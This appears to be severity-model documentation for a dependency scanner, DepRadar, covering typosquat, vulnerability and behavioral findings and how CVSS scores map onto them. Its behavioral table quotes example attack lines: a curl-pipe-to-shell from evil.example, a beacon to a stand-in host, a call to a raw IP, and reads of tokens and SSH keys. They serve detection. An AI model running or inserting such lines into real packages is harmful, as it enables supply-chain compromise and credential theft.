# Finding severity model

Every finding DepRadar reports — typosquat, vulnerability, or behavioral —
carries one of four severity levels: **low**, **medium**, **high**, or
**critical**. This page defines what each level means, gives an example per
[`FindingKind`](../src/model.rs) and per behavioral detector, and explains
how CVSS scores map in. Detector authors: rate new findings consistently
with these definitions and add an example here.

## The levels

| Level | Meaning |
| --- | --- |
| **Critical** | Near-certain compromise; act before merging or deploying. |
| **High** | Strong indicator of a malicious or vulnerable dependency; block CI by default (`--fail-on high`). |
| **Medium** | Suspicious, needs human judgment; worth reviewing but not a default CI failure. |
| **Low** | Informational context for a reviewer; almost always benign on its own. |

## How each finding kind is rated

`severity_of` in [`src/report/mod.rs`](../src/report/mod.rs) applies these
rules, in order:

### `FindingKind::Typosquat`

A homoglyph impersonation is **critical**: lookalike Unicode characters
only reach a package name deliberately — an honest near-collision never
contains a Cyrillic `а` where the popular package has a Latin `a`.
Example: a package whose normalized name is exactly `react` after
homoglyph folding, but isn't `react`.

A name that is merely a few edits from a popular package is **high**: it
may be an honest near-collision, but it's also the classic typosquat
shape. Example: `expresss` (one extra `s` from `express`).

### `FindingKind::Vulnerability`

A vulnerability takes the severity of its OSV advisory — see "How CVSS
maps in" below. When the advisory has no usable severity data, or the
full record couldn't be fetched, the finding is rated **high**
(`UNRATED_ADVISORY`): erring high keeps unrated advisories from slipping
past a CI gate. Example: an advisory with a CVSS v3 vector of
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (base score 9.8) is
**critical**.

### Behavioral findings

Behavioral detectors ([`src/behavioral/`](../src/behavioral/mod.rs)) rate
by what the behavior can do at install time:

| Signal | Level | Example |
| --- | --- | --- |
| `setup.py` command execution (`subprocess`, `os.system`, `exec`, `eval`) | **High** | `subprocess.run(['sh', '-c', payload], check=False)` in `setup.py` — arbitrary code runs on install. |
| `setup.py` obfuscation (`base64.b64decode`) | **Medium** | `base64.b64decode(meta)` decoding a payload embedded in the sdist. |
| `setup.py` network calls (`urllib`, `requests`) | **Medium** | `urllib.request.urlopen('https://evil.example/beacon')` phoning home during install. |
| Native binaries shipped in a package | **Low** | An ELF, PE, or Mach-O file, or a `.exe`/`.dll`/`.so`/`.dylib`, inside an unpacked npm or PyPI package — informational, since native addons are common and legitimate. |
| New install script between two versions | **Medium** | A patch release that adds `setup.py` or an npm `postinstall` hook. |
| npm install script (`preinstall`, `install`, `postinstall`, `prepare`) | **Medium** | A declared lifecycle hook such as `"postinstall": "node scripts/build.js"` — most are legitimate, but the hook runs arbitrary code on install, so it is surfaced for review. |
| Install script downloads and pipes to a shell | **High** | `curl -fsSL https://evil.example/x.sh \| sh` in an npm `preinstall` script or a file it invokes. |
| Install script talks to a raw IP address | **Medium** | `fetch('http://203.0.113.9/collect')` — bypasses hostname-based allowlists and is unusual in a build script. |
| Install script reads tokens or secret files | **High** | `process.env.NPM_TOKEN`, `process.env.AWS_SECRET_ACCESS_KEY`, `~/.ssh/id_rsa` or `~/.npmrc` read from an install script. |
| Obfuscated JavaScript | **Medium / High** | A file scoring 4–7 on the obfuscation heuristics (encoded blobs, `eval`/`new Function`/`atob`, high-entropy strings, very long lines) is **medium**; 8+ is **high**. A minified bundle gets only the long-line point and is not flagged. |
| New suspicious `setup.py` call between two versions | *(inherits)* | The new call keeps the level of its kind (command execution → high, obfuscation/network → medium). |

## How CVSS maps in

Vulnerability findings inherit their advisory's CVSS v3.x base score, which
[`Severity::from_score`](../src/cve/severity.rs) buckets using the standard
qualitative ratings from the
[CVSS v3.1 specification](https://www.first.org/cvss/v3.1/specification-document):

| CVSS v3 base score | Level |
| --- | --- |
| 0.0 – 3.9 | **Low** |
| 4.0 – 6.9 | **Medium** |
| 7.0 – 8.9 | **High** |
| 9.0 – 10.0 | **Critical** |

A score of exactly 0.0 ("None" in CVSS) is reported as **low**, not as a
separate "none" level. When an advisory carries no CVSS vector, the
`database_specific.severity` label (`LOW`, `MODERATE`, `MEDIUM`, `HIGH`,
`CRITICAL`) is used instead; `MODERATE` maps to **medium**. When neither
is available — or the advisory record couldn't be fetched — the finding is
rated **high** (see above).

## Severity in output

- The CLI's `--fail-on` flag (`low|medium|high|critical|none`, default
  `high`) sets the level at which a scan exits non-zero.
- SARIF output maps critical/high to `error`, medium to `warning`, and low
  to `note`, and attaches a representative `security-severity` score
  (9.5 / 8.0 / 5.5 / 2.0) so GitHub code scanning buckets findings the
  same way.
- Text output color-codes the level label.

## Adding a detector

1. Give every finding a level from the table above; when in doubt, match
   the closest existing signal (install-time code execution → high,
   context a human should glance at → low).
2. Use the shared [`Severity`](../src/cve/severity.rs) enum — don't invent
   per-detector levels.
3. Add a row or bullet with a concrete example on this page.
